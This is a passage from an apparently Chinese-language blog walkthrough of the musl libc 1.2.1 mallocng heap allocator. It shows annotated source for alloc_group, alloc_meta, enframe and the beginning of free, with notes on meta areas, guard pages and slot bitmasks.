class="keyword">int</span> sc, <span class="keyword">size_t</span> req)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> size = UNIT*size_classes[sc];</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, cnt;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *p;</span><br><span class="line">    <span class="comment">//先分配一个meta管理group</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> alloc_meta();</span><br><span class="line">    <span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> usage = ctx.usage_by_class[sc];</span><br><span class="line">    <span class="keyword">size_t</span> pagesize = PGSZ;</span><br><span class="line">    <span class="keyword">int</span> active_idx;</span><br><span class="line">    <span class="keyword">if</span> (sc &lt; <span class="number">9</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (i&lt;<span class="number">2</span> &amp;&amp; <span class="number">4</span>*small_cnt_tab[sc][i] &gt; usage)</span><br><span class="line">            i++;</span><br><span class="line">        cnt = small_cnt_tab[sc][i];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// lookup max number of slots fitting in power-of-two size</span></span><br><span class="line">        <span class="comment">// from a table, along with number of factors of two we</span></span><br><span class="line">        <span class="comment">// can divide out without a remainder or reaching 1.</span></span><br><span class="line">        cnt = med_cnt_tab[sc&amp;<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// reduce cnt to avoid excessive eagar allocation.</span></span><br><span class="line">        <span class="keyword">while</span> (!(cnt&amp;<span class="number">1</span>) &amp;&amp; <span class="number">4</span>*cnt &gt; usage)</span><br><span class="line">            cnt &gt;&gt;= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// data structures don&#x27;t support groups whose slot offsets</span></span><br><span class="line">        <span class="comment">// in units don&#x27;t fit in 16 bits.</span></span><br><span class="line">        <span class="keyword">while</span> (size*cnt &gt;= <span class="number">65536</span>*UNIT)</span><br><span class="line">            cnt &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If we selected a count of 1 above but it&#x27;s not sufficient to use</span></span><br><span class="line">    <span class="comment">// mmap, increase to 2. Then it might be; if not it will nest.</span></span><br><span class="line">    <span class="keyword">if</span> (cnt==<span class="number">1</span> &amp;&amp; size*cnt+UNIT &lt;= pagesize/<span class="number">2</span>) cnt = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// All choices of size*cnt are &quot;just below&quot; a power of two, so anything</span></span><br><span class="line">    <span class="comment">// larger than half the page size should be allocated as whole pages.</span></span><br><span class="line">    <span class="keyword">if</span> (size*cnt+UNIT &gt; pagesize/<span class="number">2</span>) &#123;</span><br><span class="line">        <span class="comment">// check/update bounce counter to start/increase retention</span></span><br><span class="line">        <span class="comment">// of freed maps, and inhibit use of low-count, odd-size</span></span><br><span class="line">        <span class="comment">// small mappings and single-slot groups if activated.</span></span><br><span class="line">        <span class="keyword">int</span> nosmall = is_bouncing(sc);</span><br><span class="line">        account_bounce(sc);</span><br><span class="line">        step_seq();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// since the following count reduction opportunities have</span></span><br><span class="line">        <span class="comment">// an absolute memory usage cost, don&#x27;t overdo them. count</span></span><br><span class="line">        <span class="comment">// coarse usage as part of usage.</span></span><br><span class="line">        <span class="keyword">if</span> (!(sc&amp;<span class="number">1</span>) &amp;&amp; sc&lt;<span class="number">32</span>) usage += ctx.usage_by_class[sc+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// try to drop to a lower count if the one found above</span></span><br><span class="line">        <span class="comment">// increases usage by more than 25%. these reduced counts</span></span><br><span class="line">        <span class="comment">// roughly fill an integral number of pages, just not a</span></span><br><span class="line">        <span class="comment">// power of two, limiting amount of unusable space.</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">4</span>*cnt &gt; usage &amp;&amp; !nosmall) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((sc&amp;<span class="number">3</span>)==<span class="number">1</span> &amp;&amp; size*cnt&gt;<span class="number">8</span>*pagesize) cnt = <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((sc&amp;<span class="number">3</span>)==<span class="number">2</span> &amp;&amp; size*cnt&gt;<span class="number">4</span>*pagesize) cnt = <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((sc&amp;<span class="number">3</span>)==<span class="number">0</span> &amp;&amp; size*cnt&gt;<span class="number">8</span>*pagesize) cnt = <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((sc&amp;<span class="number">3</span>)==<span class="number">0</span> &amp;&amp; size*cnt&gt;<span class="number">2</span>*pagesize) cnt = <span class="number">5</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">size_t</span> needed = size*cnt + UNIT;</span><br><span class="line">        needed += -needed &amp; (pagesize<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// produce an individually-mmapped allocation if usage is low,</span></span><br><span class="line">        <span class="comment">// bounce counter hasn&#x27;t triggered, and either it saves memory</span></span><br><span class="line">        <span class="comment">// or it avoids eagar slot allocation without wasting too much.</span></span><br><span class="line">        <span class="keyword">if</span> (!nosmall &amp;&amp; cnt&lt;=<span class="number">7</span>) &#123;</span><br><span class="line">            req += IB + UNIT;</span><br><span class="line">            req += -req &amp; (pagesize<span class="number">-1</span>);</span><br><span class="line">            <span class="keyword">if</span> (req&lt;size+UNIT || (req&gt;=<span class="number">4</span>*pagesize &amp;&amp; <span class="number">2</span>*cnt&gt;usage)) &#123;</span><br><span class="line">                cnt = <span class="number">1</span>;</span><br><span class="line">                needed = req;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p = mmap(<span class="number">0</span>, needed, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (p==MAP_FAILED) &#123;</span><br><span class="line">            free_meta(m);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        m-&gt;maplen = needed&gt;&gt;<span class="number">12</span>;</span><br><span class="line">        ctx.mmap_counter++;</span><br><span class="line">        active_idx = (<span class="number">4096</span>-UNIT)/size<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (active_idx &gt; cnt<span class="number">-1</span>) active_idx = cnt<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (active_idx &lt; <span class="number">0</span>) active_idx = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> j = size_to_class(UNIT+cnt*size-IB);</span><br><span class="line">        <span class="keyword">int</span> idx = alloc_slot(j, UNIT+cnt*size-IB);</span><br><span class="line">        <span class="keyword">if</span> (idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            free_meta(m);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> ctx.active[j];</span><br><span class="line">        p = enframe(g, idx, UNIT*size_classes[j]-IB, ctx.mmap_counter);</span><br><span class="line">        m-&gt;maplen = <span class="number">0</span>;</span><br><span class="line">        p[<span class="number">-3</span>] = (p[<span class="number">-3</span>]&amp;<span class="number">31</span>) | (<span class="number">6</span>&lt;&lt;<span class="number">5</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;=cnt; i++)</span><br><span class="line">            p[UNIT+i*size<span class="number">-4</span>] = <span class="number">0</span>;</span><br><span class="line">        active_idx = cnt<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ctx.usage_by_class[sc] += cnt;</span><br><span class="line">    m-&gt;avail_mask = (<span class="number">2u</span>&lt;&lt;active_idx)<span class="number">-1</span>;</span><br><span class="line">    m-&gt;freed_mask = (<span class="number">2u</span>&lt;&lt;(cnt<span class="number">-1</span>))<span class="number">-1</span> - m-&gt;avail_mask;</span><br><span class="line">    m-&gt;mem = (<span class="keyword">void</span> *)p;</span><br><span class="line">    m-&gt;mem-&gt;meta = m;</span><br><span class="line">    m-&gt;mem-&gt;active_idx = active_idx;</span><br><span class="line">    m-&gt;last_idx = cnt<span class="number">-1</span>;</span><br><span class="line">    m-&gt;freeable = <span class="number">1</span>;</span><br><span class="line">    m-&gt;sizeclass = sc;</span><br><span class="line">    <span class="keyword">return</span> m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>通过mmap分配Group，初始化相关信息。</p>

        <h4 id="④alloc-meta"   >
          <a href="#④alloc-meta" class="heading-link"><i class="fas fa-link"></i></a><a href="#④alloc-meta" class="headerlink" title="④alloc_meta"></a>④alloc_meta</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.1 /src/malloc/mallocng/malloc.c</span></span><br><span class="line"><span class="comment">//用来分配meta对象</span></span><br><span class="line"><span class="function">struct meta *<span class="title">alloc_meta</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *p;</span><br><span class="line">    <span class="comment">//判断ctx是否完成初始化，没完成就整一下</span></span><br><span class="line">	<span class="keyword">if</span> (!ctx.init_done) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">		ctx.pagesize = get_page_size();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">		ctx.secret = get_random_secret();</span><br><span class="line">		ctx.init_done = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//pagesize的设置</span></span><br><span class="line">	<span class="keyword">size_t</span> pagesize = PGSZ;</span><br><span class="line">	<span class="keyword">if</span> (pagesize &lt; <span class="number">4096</span>) pagesize = <span class="number">4096</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//首先看能不能从free_meta_head中获得meta对象，一般是将一个meta-group中的</span></span><br><span class="line">    <span class="comment">//chunk全部分配完然后全部释放完就会自动进入meta-group的释放阶段，成功就进入</span></span><br><span class="line">    <span class="comment">//进入到ctx.free_meta_head中</span></span><br><span class="line">	<span class="keyword">if</span> ((m = dequeue_head(&amp;ctx.free_meta_head))) <span class="keyword">return</span> m;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//ctx中如果没有可用的meat对象</span></span><br><span class="line">	<span class="keyword">if</span> (!ctx.avail_meta_count) &#123;</span><br><span class="line">		<span class="keyword">int</span> need_unprotect = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//ctx中没有空闲的meat对象且ctx.brk不为-1</span></span><br><span class="line">		<span class="keyword">if</span> (!ctx.avail_meta_area_count &amp;&amp; ctx.brk!=<span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="comment">//分配一页内存0x1000</span></span><br><span class="line">			<span class="keyword">uintptr_t</span> <span class="keyword">new</span> = ctx.brk + pagesize;</span><br><span class="line">			<span class="keyword">int</span> need_guard = <span class="number">0</span>;</span><br><span class="line">            <span class="comment">//如果ctx.brk为0,一般在初始化的时候</span></span><br><span class="line">			<span class="keyword">if</span> (!ctx.brk) &#123;</span><br><span class="line">				need_guard = <span class="number">1</span>;</span><br><span class="line">                <span class="comment">//调用brk()获取堆地址</span></span><br><span class="line">				ctx.brk = brk(<span class="number">0</span>);</span><br><span class="line">				<span class="comment">// some ancient kernels returned _ebss</span></span><br><span class="line">				<span class="comment">// instead of next page as initial brk.</span></span><br><span class="line">				ctx.brk += -ctx.brk &amp; (pagesize<span class="number">-1</span>);</span><br><span class="line">				<span class="keyword">new</span> = ctx.brk + <span class="number">2</span>*pagesize;</span><br><span class="line">			&#125;</span><br><span class="line">            <span class="comment">//brk()分配heap到new地址失败</span></span><br><span class="line">			<span class="keyword">if</span> (brk(<span class="keyword">new</span>) != <span class="keyword">new</span>) &#123;</span><br><span class="line">				ctx.brk = <span class="number">-1</span>;</span><br><span class="line">			&#125; </span><br><span class="line">            <span class="comment">//分配成功</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//保护页, 在brk后面映射一个不可用的页(PROT_NONE),</span></span><br><span class="line">                <span class="comment">//如果堆溢出到这里就会发送SIGV</span></span><br><span class="line">				<span class="keyword">if</span> (need_guard) mmap((<span class="keyword">void</span> *)ctx.brk, pagesize,</span><br><span class="line">					PROT_NONE, MAP_ANON|MAP_PRIVATE|MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">				ctx.brk = <span class="keyword">new</span>;</span><br><span class="line">                <span class="comment">//把这一页全划分为meta对象</span></span><br><span class="line">				ctx.avail_meta_areas = (<span class="keyword">void</span> *)(<span class="keyword">new</span> - pagesize);</span><br><span class="line">				ctx.avail_meta_area_count = pagesize&gt;&gt;<span class="number">12</span>;</span><br><span class="line">				need_unprotect = <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">//如果前面brk()分配失败了, 直接mmap匿名映射一片PROT_NONE的内存再划分</span></span><br><span class="line">		<span class="keyword">if</span> (!ctx.avail_meta_area_count) &#123;</span><br><span class="line">			<span class="keyword">size_t</span> n = <span class="number">2UL</span> &lt;&lt; ctx.meta_alloc_shift;</span><br><span class="line">			p = mmap(<span class="number">0</span>, n*pagesize, PROT_NONE,</span><br><span class="line">				MAP_PRIVATE|MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">			<span class="keyword">if</span> (p==MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			ctx.avail_meta_areas = p + pagesize;</span><br><span class="line">			ctx.avail_meta_area_count = (n<span class="number">-1</span>)*(pagesize&gt;&gt;<span class="number">12</span>);</span><br><span class="line">			ctx.meta_alloc_shift++;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">//如果avail_meta_areas与4K对齐, 那么就说明这片区域是刚刚申请的一页</span></span><br><span class="line">        <span class="comment">//所以需要修改内存的权限,更改为读写保护的</span></span><br><span class="line">		p = ctx.avail_meta_areas;</span><br><span class="line">		<span class="keyword">if</span> ((<span class="keyword">uintptr_t</span>)p &amp; (pagesize<span class="number">-1</span>)) need_unprotect = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span> (need_unprotect)</span><br><span class="line">			<span class="keyword">if</span> (mprotect(p, pagesize, PROT_READ|PROT_WRITE)</span><br><span class="line">			    &amp;&amp; errno != ENOSYS)</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		ctx.avail_meta_area_count--;</span><br><span class="line">		ctx.avail_meta_areas = p + <span class="number">4096</span>;</span><br><span class="line">		<span class="keyword">if</span> (ctx.meta_area_tail) &#123;</span><br><span class="line">			ctx.meta_area_tail-&gt;next = (<span class="keyword">void</span> *)p;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			ctx.meta_area_head = (<span class="keyword">void</span> *)p;</span><br><span class="line">		&#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//初始化ctx的相关信息</span></span><br><span class="line">		ctx.meta_area_tail = (<span class="keyword">void</span> *)p;</span><br><span class="line">		ctx.meta_area_tail-&gt;check = ctx.secret;</span><br><span class="line">		ctx.avail_meta_count = ctx.meta_area_tail-&gt;nslots</span><br><span class="line">			= (<span class="number">4096</span>-<span class="keyword">sizeof</span>(struct meta_area))/<span class="keyword">sizeof</span> *m;</span><br><span class="line">		ctx.avail_meta = ctx.meta_area_tail-&gt;slots;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//ctx的可用meta对象数组中有能用的,从中直接分配出来即可</span></span><br><span class="line">	ctx.avail_meta_count--;</span><br><span class="line">	m = ctx.avail_meta++;</span><br><span class="line">	m-&gt;prev = m-&gt;next = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li>查看ctx是否完成初始化，没完成就初始化一下</li>
<li>如果ctx.free_meta_head链表中有空闲的meta, 那么直接从这里分配一个meta</li>
<li>如果ctx.avail_meta_count&gt;0，代表最开始分配出来的meta对象还没有被用完，直接从ctx.avail_meta对象数组中分配一个</li>
<li>如果ctx.avail_meta_count=0，则代表最开始分配的meta对象已经用完，没有可用的，那么就说明需要向OS申请内存存放meta<ul>
<li>先通过brk分配1页，如果分配成功，则将新的内存页直接划分为meta对象，然后修改之后的内存页的权限。</li>
<li>如果brk失败的话则会通过mmap()分配许多页内存, 但是这些内存都是PROT_NONE的, 属于guard page, 堆溢出到这些页面会引发SIGV, 而meta不使用开头与结尾的一页, 防止被溢出</li>
</ul>
</li>
<li>分配成功后设置ctx中的meta_area_tail, avail_meta_cnt等信息, 把新分配的一页作为待划分的meta。</li>
</ul>

        <h4 id="⑤enframe"   >
          <a href="#⑤enframe" class="heading-link"><i class="fas fa-link"></i></a><a href="#⑤enframe" class="headerlink" title="⑤enframe"></a>⑤enframe</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.1 /src/malloc/mallocng/meta.h</span></span><br><span class="line"><span class="comment">//分配chunk时，设置group用的函数</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">enframe</span><span class="params">(struct meta *g, <span class="keyword">int</span> idx, <span class="keyword">size_t</span> n, <span class="keyword">int</span> ctr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> stride = get_stride(g);</span><br><span class="line">	<span class="keyword">size_t</span> slack = (stride-IB-n)/UNIT;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *p = g-&gt;mem-&gt;storage + stride*idx;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *end = p+stride-IB;</span><br><span class="line">	<span class="comment">// cycle offset within slot to increase interval to address</span></span><br><span class="line">	<span class="comment">// reuse, facilitate trapping double-free.</span></span><br><span class="line">	<span class="keyword">int</span> off = (p[<span class="number">-3</span>] ? *(<span class="keyword">uint16_t</span> *)(p<span class="number">-2</span>) + <span class="number">1</span> : ctr) &amp; <span class="number">255</span>;</span><br><span class="line">	assert(!p[<span class="number">-4</span>]);</span><br><span class="line">	<span class="keyword">if</span> (off &gt; slack) &#123;</span><br><span class="line">		<span class="keyword">size_t</span> m = slack;</span><br><span class="line">		m |= m&gt;&gt;<span class="number">1</span>; m |= m&gt;&gt;<span class="number">2</span>; m |= m&gt;&gt;<span class="number">4</span>;</span><br><span class="line">		off &amp;= m;</span><br><span class="line">		<span class="keyword">if</span> (off &gt; slack) off -= slack+<span class="number">1</span>;</span><br><span class="line">		assert(off &lt;= slack);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (off) &#123;</span><br><span class="line">		<span class="comment">// store offset in unused header at offset zero</span></span><br><span class="line">		<span class="comment">// if enframing at non-zero offset.</span></span><br><span class="line">		*(<span class="keyword">uint16_t</span> *)(p<span class="number">-2</span>) = off;</span><br><span class="line">		p[<span class="number">-3</span>] = <span class="number">7</span>&lt;&lt;<span class="number">5</span>;</span><br><span class="line">		p += UNIT*off;</span><br><span class="line">		<span class="comment">// for nonzero offset there is no permanent check</span></span><br><span class="line">		<span class="comment">// byte, so make one.</span></span><br><span class="line">		p[<span class="number">-4</span>] = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	*(<span class="keyword">uint16_t</span> *)(p<span class="number">-2</span>) = (<span class="keyword">size_t</span>)(p-g-&gt;mem-&gt;storage)/UNIT;</span><br><span class="line">	p[<span class="number">-3</span>] = idx;</span><br><span class="line">	set_size(p, end, n);</span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-free-1"   >
          <a href="#2-free-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-free-1" class="headerlink" title="(2)free"></a>(2)free</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free</span><span class="params">(<span class="keyword">void</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line">   	<span class="comment">//获取相关信息</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> get_meta(p);</span><br><span class="line">	<span class="keyword">int</span> idx = get_slot_index(p);</span><br><span class="line">	<span class="keyword">size_t</span> stride = get_stride(g);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *start = g-&gt;mem-&gt;storage + stride*idx;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *end = start + stride - IB;</span><br><span class="line">	get_nominal_size(p, end);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//计算这个chunk对应avail_mask和freed_mask的bitmap</span></span><br><span class="line">	<span class="keyword">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;idx, all = (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span>;</span><br><span class="line">	((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p)[<span class="number">-3</span>] = <span class="number">255</span>;</span><br><span class="line">	<span class="comment">// invalidate offset to group header, and cycle offset of</span></span><br><span class="line">	<span class="comment">// used region within slot if current offset is zero.</span></span><br><span class="line">	*(<span class="keyword">uint16_t</span> *)((<span class="keyword">char</span> *)p<span class="number">-2</span>) = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// release any whole pages contained in the slot to be freed</span></span><br><span class="line">	<span class="comment">// unless it&#x27;s a single-slot group that will be unmapped.</span></span><br><span class="line">	<span class="keyword">if</span> (((<span class="keyword">uintptr_t</span>)(start<span class="number">-1</span>) ^ (<span class="keyword">uintptr_t</span>)end) &gt;= <span class="number">2</span>*PGSZ &amp;&amp; g-&gt;last_idx) &#123;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">char</span> *base = start + (-(<span class="keyword">uintptr_t</span>)start &amp; (PGSZ<span class="number">-1</span>));</span><br><span class="line">		<span class="keyword">size_t</span> len = (end-base) &amp; -PGSZ;</span><br><span class="line">		<span class="keyword">if</span> (len) madvise(base, len, MADV_FREE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// atomic free without locking if this is neither first or last slot</span></span><br><span class="line">    <span class="comment">//在meta-&gt;freed_mask中标记一下, 表示这个chunk已经被释放了</span></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="keyword">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line">		<span class="keyword">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line">		<span class="keyword">uint32_t</span> mask = freed | avail;</span><br><span class="line">		assert(!(mask&amp;self));<span class="comment">//要释放的chunk应该既不在freed中, 也不在avail中</span></span><br><span class="line">        </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1.如果满足  mask+self==all  , 那就说明释放了这个chunk之后这个group</span></span><br><span class="line"><span class="comment">中所有chunk都被释放,就需要调用nontrivial_free回收整个meta-group</span></span><br><span class="line"><span class="comment">因此这个meta需要调用nontrivial_free()回收这个group</span></span><br><span class="line"><span class="comment">2.如果满足  !freed  ,那么就说明该meta-group中没有被释放的chunk,有可能是第一次从该</span></span><br><span class="line"><span class="comment">有可能这个group全部被分配出去了, 这样group是会弹出avtive队列的, 而现在释放了一个</span></span><br><span class="line"><span class="comment">其中的chunk,所以需要调用nontrivial_free()把这个group重新加入队列</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">		<span class="keyword">if</span> (!freed || mask+self==all) <span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//线程方面的一些知识，还不是太会</span></span><br><span class="line">		<span class="keyword">if</span> (!MT)</span><br><span class="line">			g-&gt;freed_mask = freed+self;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	wrlock();</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);</span><br><span class="line">	unlock();</span><br><span class="line">	<span class="keyword">if</span> (mi.len) munmap(mi.base, 